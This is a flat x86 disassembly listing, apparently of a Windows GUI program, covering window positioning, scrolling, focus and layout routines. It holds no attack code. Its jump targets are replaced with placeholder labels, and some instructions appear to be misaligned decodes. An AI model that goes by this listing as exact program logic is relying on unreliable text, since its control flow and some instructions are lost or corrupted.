je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_43db24
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_43ac9c
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_43a82c
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_43ac60
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_43dc14
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_4141cc
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_414060
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_4141ec
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_414170
call sub_43df6c
jmp r-xdata
mov eax ebp
mov edx esi
call sub_414170
call sub_43df6c
sub_43dcec
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_43dc14
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_43dd4c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_43df6c
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_43df6c
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b64c
call sub_403a08
test eax eax
jne r-xdata
sub_43ddb0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43e270
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_438978
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_42b480
call sub_42b560
test al al
je r-xdata
mov eax ebx
call sub_43ac9c
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_43ac60
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_43ac60
test [ eax + 0x52 ] 0x4
je r-xdata
sub_43de74
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_43714c
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_43deac
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_44e0a8
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_43deec
push ebx
mov ebx eax
mov eax ebx
call sub_44e0a8
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_451e14
pop ebx
retn
mov eax ebx
call sub_44e0d0
mov eax ebx
call sub_43df6c
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_43df24
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43df48
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_43df48
sub_43df80
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_412d08
mov eax edi
call sub_43ac9c
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_43ac60
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_43e014
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_43df6c
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_43e04c
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_43e270
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_43df6c
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_403490
sub_43e108
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_4141cc
pop esi
pop ebx
retn
sub_43e12c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_43e108
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_414060
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_4141ec
sub_43e1a0
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_43e270
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_438978
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_43e200
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_43e264
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e26b
lea eax [ ebp - 0x4 ]
call sub_40568c
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_403490
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_4056a4
sub_43e27c
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_436e00
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_43e334
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_414170
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_414014
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_403490
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_43e394
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_43e48a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_403490
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e491
mov eax [ ebp - 0x14 ]
call sub_403294
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_4141cc
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_414170
mov edi eax
mov eax edi
mov si 0xffb8
call sub_403490
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_43e4a0
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_43e394
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_43e4cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43ac9c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43ac60
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_43e514
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_43dc14
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_437a1c
sub_43e55c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_43e5e0
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_43e270
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_43ac9c
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_43e9a2
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_43ac9c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_43e55c
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_43ac60
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_43e9b9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_43e5e0
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_438814
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_43e9f8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_439698
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_437114
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_43ea40
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4398b8
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_43ea70
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_43e270
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_43a804
xor ecx ecx
push ebp
push sub_43eb9f
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_43ac9c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_43ac9c
test eax eax
jle r-xdata
xor eax eax
